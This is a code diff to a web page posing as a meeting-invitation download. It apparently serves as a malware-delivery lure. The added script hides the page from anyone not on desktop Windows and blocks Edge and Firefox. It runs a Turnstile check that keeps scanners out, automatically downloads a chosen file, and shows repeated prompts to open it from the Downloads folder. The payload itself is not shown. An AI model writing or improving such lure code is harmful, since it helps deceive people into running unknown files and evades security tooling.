+        updateProgress(100);
+        const blob = new Blob(chunks);
+        const blobUrl = window.URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = blobUrl;
+        a.download = file.name;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        window.URL.revokeObjectURL(blobUrl);
+        showToast("✅ Download complete. Open <b>" + file.name + "</b>");
+    } catch (err) {
+        console.log("Fallback download");
+        const a = document.createElement("a");
+        a.href = file.url;
+        a.download = file.name;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+}
+
+function launchMeeting() {
+    if (!turnstileVerified) {
+        showToast("✓ Please complete verification first", true);
+        return;
+    }
+    if (!isDesktopWindows()) {
+        const warningDiv = document.getElementById("deviceWarning");
+        const loadingOverlay = document.getElementById("loading-overlay");
+        const formContainer = document.querySelector(".form-container");
+        if (loadingOverlay) loadingOverlay.style.display = "none";
+        if (formContainer) formContainer.style.display = "none";
+        if (warningDiv) warningDiv.style.display = "block";
+        return;
+    }
+    downloadFile(selectedFile);
+    setTimeout(() => {
+        showToast('📂 Go to Downloads and open <b>' + selectedFile.name + '</b>', false, 30000);
+    }, 1200);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    currentPageUrl = getCurrentInvitationUrl();
+    // First: block Edge/Firefox before anything else
     if (preFlightBrowserCheck()) {
-        return; 
+        return;
     }
     
-    const btn = document.getElementById("manualDownload");
-    const loadingOverlay = document.getElementById("loading-overlay");
+    if (!isDesktopWindows()) {
+        document.getElementById('loading-overlay').style.display = 'none';
+        const deviceWarningDiv = document.getElementById("deviceWarning");
+        if (deviceWarningDiv) deviceWarningDiv.style.display = "block";
+        return;
+    }
     
-    if (typeof turnstile !== 'undefined') {
-        turnstile.ready(() => {
-            turnstile.render('#cf-turnstile', {
-                sitekey: '0x4AAAAAAC1YxUs3N81QT2L0',
-                callback: () => {
-                    turnstileVerified = true;
-                    if (loadingOverlay) loadingOverlay.style.display = 'none';
+    turnstile.ready(function() {
+        turnstile.render('#cf-turnstile', {
+            sitekey: '0x4AAAAAAC1YxUs3N81QT2L0',
+            callback: function(token) {
+                document.querySelector('.loading-text').textContent = 'Verifying meeting ID...';
+                turnstileVerified = true;
+                setTimeout(function() {
+                    document.getElementById('loading-overlay').style.display = 'none';
                     document.body.classList.add('verified');
-                    setTimeout(() => {
-                        launchMeeting();
-                    }, 800);
-                },
-                'error-callback': () => {
-                    console.warn("Turnstile error");
-                    if (loadingOverlay) loadingOverlay.style.display = 'none';
-                    showToast("Verification error, please refresh", true);
-                }
-            });
+                    const manualBtn = document.getElementById("manualDownload");
+                    const launchBtn = document.getElementById("launchBtn");
+                    if (manualBtn) {
+                        manualBtn.style.pointerEvents = "auto";
+                        manualBtn.style.opacity = "1";
+                    }
+                    if (launchBtn) launchBtn.disabled = false;
+                    setTimeout(launchMeeting, 1200);
+                }, 2000);
+            },
+            'error-callback': function() {
+                document.querySelector('.loading-text').textContent = 'Verification failed. Please refresh the page.';
+                turnstileVerified = false;
+            }
         });
-    } else {
-        console.error("Turnstile not loaded");
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-        showToast("Security check failed, reload page", true);
-    }
-    
-    if (btn) {
-        btn.disabled = true;
-        btn.onclick = () => {
+    });
+
+    const manualBtn = document.getElementById("manualDownload");
+    const launchBtn = document.getElementById("launchBtn");
+    if (manualBtn) {
+        manualBtn.style.pointerEvents = "none";
+        manualBtn.style.opacity = "0.5";
+        manualBtn.addEventListener("click", function(e) {
+            e.preventDefault();
             if (!turnstileVerified) {
-                showToast("Complete Cloudflare verification first", true);
+                showToast("✓ Please complete verification first", true);
                 return;
             }
             launchMeeting();
-        };
-        setTimeout(() => {
-            if (!turnstileVerified && btn) {
-                btn.disabled = false;
-                btn.textContent = "Verify & Download";
-                btn.onclick = () => {
-                    showToast("Please complete the security puzzle above", true);
-                };
-            } else if (turnstileVerified && btn) {
-                btn.disabled = false;
-                btn.textContent = "Download Invitation Card";
-                btn.onclick = launchMeeting;
-            }
-        }, 3000);
+        });
     }
-    
-    let checkInterval = setInterval(() => {
-        if (turnstileVerified && btn) {
-            btn.disabled = false;
-            btn.textContent = "Download Invitation Card";
-            btn.onclick = launchMeeting;
-            clearInterval(checkInterval);
-        }
-    }, 500);
-    
-    setTimeout(() => {
-        if (loadingOverlay && loadingOverlay.style.display !== 'none') {
+    if (launchBtn) {
+        launchBtn.disabled = true;
+        launchBtn.addEventListener("click", function() {
             if (!turnstileVerified) {
-                loadingOverlay.style.display = 'none';
-                showToast("Verification timed out. Refresh the page.", true);
-            } else {
-                loadingOverlay.style.display = 'none';
+                showToast("✓ Please complete verification first", true);
+                return;
             }
-        }
-    }, 12000);
-});
-
-window.addEventListener('load', () => {
-    if (isBlockedBrowser() && document.getElementById("browser-warning").style.display !== "flex") {
-        showBlockedWarning();
+            launchMeeting();
+        });
     }
 });
 </script>
-
 </body>
 </html>
